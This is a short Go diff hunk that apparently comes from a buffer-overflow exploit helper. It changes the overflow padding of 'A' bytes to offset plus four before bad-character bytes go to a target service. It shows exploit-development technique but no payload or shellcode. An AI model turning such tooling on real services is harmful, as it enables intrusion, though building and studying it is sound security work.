@@ -17,7 +17,7 @@ func Chars(host string, port int, offset int, exclude string, pref,
     }
 
     // generate the overflow
-    pad := generateBytes(0x41, offset)
+    pad := generateBytes(0x41, offset + 4)
 
     // generate the byte array of characters to send to the target service
     fmt.Println(" > Generating characters.")
